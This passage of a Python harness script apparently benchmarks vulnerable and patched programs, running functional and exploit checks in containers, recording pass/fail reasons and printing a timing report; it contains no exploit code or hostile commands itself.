            p_vuln = attacker.run_exploit_check(container, "main_patched.py", cep, aep)
            t_sec = time.time() - t2

            if v_func and v_vuln and p_func and not p_vuln:
                status = "PASS"
                reasons = []
            else:
                reasons = []
                if not v_func: reasons.append("Vuln Broken")
                if not v_vuln: reasons.append("Vuln Safe?")
                if not p_func: reasons.append("Patch Broken")
                if p_vuln:     reasons.append("Patch Bypassed")
                status = f"FAIL ({', '.join(reasons)})"

            results.append({"name": filename, "status": status,
                            "t_prov": t_prov, "t_func": t_func, "t_sec": t_sec})

            # Persist plans to generated_plans/exploited or generated_plans/failed
            _save_plans_to_disk(
                test_name=filename,
                report={
                    "passed": status == "PASS",
                    "verdict": "PASS" if status == "PASS" else "FAIL",
                    "failure_reasons": reasons if status != "PASS" else [],
                    "provision_s": t_prov,
                    "functional_s": t_func,
                    "security_s": t_sec,
                    "total_s": t_prov + t_func + t_sec,
                },
                sep=sep, cep=cep, aep=aep, fep=fep,
            )

        except Exception as e:
            results.append({"name": filename, "status": f"ERROR: {e}",
                            "t_prov": t_prov, "t_func": 0.0, "t_sec": 0.0})
        finally:
            infra.cleanup()

    total_duration = time.time() - total_start

    print("\n=== FINAL REPORT ===")
    print(f"{'FILENAME':<20} | {'STATUS':<25} | {'PROV':<8} | {'FUNC':<8} | {'SEC':<8} | {'TOTAL'}")
    print("-" * 90)

    for r in results:
        color = "\033[92m" if r['status'] == "PASS" else "\033[91m"
        reset = "\033[0m"
        total = r['t_prov'] + r['t_func'] + r['t_sec']
        print(f"{r['name']:<20} | {color}{r['status']:<25}{reset} | "
              f"{r['t_prov']:<6.2f}s | {r['t_func']:<6.2f}s | "
              f"{r['t_sec']:<6.2f}s | {total:.2f}s")

    print("-" * 90)
    print(f"TOTAL EXECUTION TIME: {total_duration:.2f}s")

if __name__ == "__main__":
    main()
